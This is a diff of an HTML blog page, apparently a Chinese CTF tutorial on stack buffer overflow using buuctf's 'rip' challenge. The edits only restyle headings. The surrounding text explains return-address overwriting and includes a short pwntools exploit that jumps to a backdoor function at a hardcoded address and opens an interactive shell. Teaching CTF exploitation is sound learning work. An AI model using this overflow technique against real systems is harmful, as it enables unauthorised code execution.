@@ -155,18 +155,18 @@
 </span>
     </div>
     <div class="post-content ">
-        <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>例子为<code>buuctf</code>中的<code>rip</code>题目</p>
+        <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>样例为<code>buuctf</code>中的<code>rip</code>题目</p>
 <blockquote>
 <p>main函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA.jpg"></p>
 </blockquote>
 <blockquote>
-<p>main函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-1.jpg"></p>
+<p><strong>main函数栈布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-1.jpg"></p>
 </blockquote>
 <blockquote>
-<p>函数调用过程<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-2.jpg"></p>
+<p><strong>函数调用过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-%E6%BA%A2%E5%87%BA-2.jpg"></p>
 </blockquote>
 <blockquote>
-<p>函数返回过程<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/20220618093204.png"><br>仅关于main函数及之后调用的函数</p>
+<p><strong>函数返回过程</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/20220618093204.png"><br>仅关于main函数及之后调用的函数</p>
 </blockquote>
 <p>可以看出来程序在返回时会将栈中的数据赋值给<code>rbp</code>,<code>rip</code>寄存器, 一个是栈底寄存器，一个是指令指针寄存器(用于控制程序执行过程), 当我们在栈中的数据覆盖了<code>ret_addr</code>时，就可以控制程序执行过程, 使程序执行我们想要执行的.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#程序中存在后门函数 (地址为0x401186)</span></span><br><span class="line"><span class="comment"># 0x401185 为 ret指令地址,(用于栈对齐)</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401185</span>)+p64(<span class="number">0x401186</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
